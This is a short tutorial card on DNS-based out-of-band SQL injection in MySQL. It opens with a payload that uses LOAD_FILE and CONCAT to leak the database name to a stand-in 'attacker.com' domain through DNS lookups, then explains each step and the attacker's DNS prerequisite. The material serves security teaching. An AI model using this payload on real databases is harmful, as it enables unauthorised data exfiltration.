1SELECT LOAD_FILE(CONCAT('\\', (SELECT database()), '.attacker.com\share'))

3-- Explanation:
4-- (SELECT database()): Retrieves the current database name.
5-- CONCAT(): Concatenates strings to form a UNC path.
6--   Example: \\dvwa.attacker.com\share
7-- LOAD_FILE(): Attempts to load a file from the specified path.
8--   This triggers a DNS lookup for 'dvwa.attacker.com'.
9-- Attacker monitors DNS logs on 'attacker.com' to capture the database name.

Practical OOB

DNS-based Data Exfiltration

Using LOAD_FILE() to trigger DNS lookups and reveal data.

Core Principle

Database server attempts to resolve a domain name controlled by the attacker, embedding exfiltrated data within the DNS query.

Prerequisite

Attacker must control a DNS server and monitor its logs to capture the incoming requests and extract the embedded data.

Key Takeaway

DNS-based OOB SQLi is a highly effective method for data exfiltration, forcing the database to communicate directly with an attacker's DNS server, bypassing web application output.
